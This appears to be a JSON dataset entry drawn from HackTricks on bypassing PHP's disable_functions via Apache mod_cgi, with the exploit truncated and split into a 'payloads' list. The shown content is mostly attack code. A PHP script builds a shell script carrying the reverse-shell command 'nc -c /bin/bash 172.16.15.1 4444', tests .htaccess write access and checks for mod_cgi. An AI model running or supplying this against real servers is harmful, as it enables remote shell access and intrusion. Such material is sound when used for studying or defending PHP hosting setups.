{
  "id": "network_services_pentesting_dce38c14e369",
  "category": "network-services-pentesting",
  "title": "disable functions bypass mod cgi",
  "description": "# mod_cgi\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n\nFrom [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)\n\n```php\n<?php\n// Only working with mod_cgi, writable dir and htaccess files enabled\n$cmd = \"nc -c '/bin/bash' 172.16.15.1 4444\"; //command to be executed\n$shellfile = \"#!/bin/bash\\n\"; //using a shellscript\n$shellfile .= \"echo -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n\"; //header is needed, otherwise a",
  "payloads": [
    "# mod_cgi",
    "{{#include ../../../../banners/hacktricks-training.md}}",
    "From [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)",
    "```php",
    "// Only working with mod_cgi, writable dir and htaccess files enabled",
    "$cmd = \"nc -c '/bin/bash' 172.16.15.1 4444\"; //command to be executed",
    "$shellfile = \"#!/bin/bash\\n\"; //using a shellscript",
    "$shellfile .= \"echo -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n\"; //header is needed, otherwise a 500 error is thrown when there is output",
    "$shellfile .= \"$cmd\"; //executing $cmd",
    "function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter",
    "echo \"$text: \" . ($condition ? $yes : $no) . \"<br>\\n\";",
    "if (!isset($_GET['checked']))",
    "@file_put_contents('.htaccess', \"\\nSetEnv HTACCESS on\", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed",
    "header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked",
    "$modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-mod_cgi.md"
  ]
}